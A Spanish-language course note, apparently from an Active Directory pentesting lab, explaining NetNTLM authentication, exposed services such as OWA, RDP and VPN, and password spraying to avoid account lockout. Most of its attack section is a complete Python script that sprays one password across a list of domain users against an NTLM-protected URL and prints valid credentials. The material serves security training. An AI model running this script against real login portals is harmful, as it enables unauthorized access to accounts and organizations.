---
layout: apunte
title: "3. NTLM Authenticated Services"
---

New Technology LAN Manager (NTLM) es la suite de protocolos de seguridad usada para autentificar identidades de usuario en un AD. El NTLM puede ser usado para autentificación usando un esquema basado en reto-respuesta llamado NetNTLM. Este mecanismo es ampliamente usado por servicios en la red. Sin embargo, los servicios que usan NetNTLM también pueden ser expuestos a internet. Los siguientes son algunos ejemplos conocidos:

- Servidores de intercambio de correo hosteados internamente que exponen un portal de inicio de sesión OWA (Outlook Web App).
- Servicio de control de escritorio remoto (RDP) de un servidor expuesto a internet.
- Endpoints VPN expuestos que fueron integrados en el AD.
- Aplicaciones web que están expuestas a internet y hacen uso de NetNTLM.

NetNTLM, también conocido como Windows Authentication o NTLM Authentication, permite a la aplicación jugar el rol de un middle man entre el cliente y el AD. Todo el material de autentificación es redirigido hacia el Domain Controller en forma de reto y si se completa exitosamente, la aplicación autentifica al usuario.

Esto significa que la aplicación está autentificando en nombre del usuario y no autentificando al usuario directamente en la aplicación misma. Esto previene a la aplicación de almacenar credenciales AD, que sólo deberían guardarse en el DC.

!**Pasted image 20260708205032.png**

-----------------------------------------
<h2>Ataques de Login por Fuerza Bruta</h2>
Como hemos mencionado en la tarea 2, estos servicios expuestos ofrecen una localización excelente para probar credenciales descubiertas usando otros medios. Sin embargo, estos servicios también pueden ser usados directamente en un intento de recuperar un ser inicial de credenciales AD. Podríamos intentar usar estos para hacer fuerza bruta si recuperamos información como direcciones de email válidas durante el reconocimiento.

Como la mayoría de entornos AD tienen bloqueo de cuenta configurado, no seremos capaz de realizar un ataque de fuerza bruta. En su lugar, necesitamos realizar un ataque de password spraying. En lugar de probar múltiples contraseñas para una misma cuenta (lo que activaría el bloqueo), probaremos múltiples cuentas para una misma contraseña. Sin embargo, hay que tener en cuenta que estos ataques pueden ser fácilmente detectados debido a la cantidad de intentos de autentificación fallidos que genera.

```python
#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))

    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
        #Start attack
        sprayer = NTLMSprayer(fqdn)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)



if __name__ == "__main__":
    main(sys.argv[1:])
```

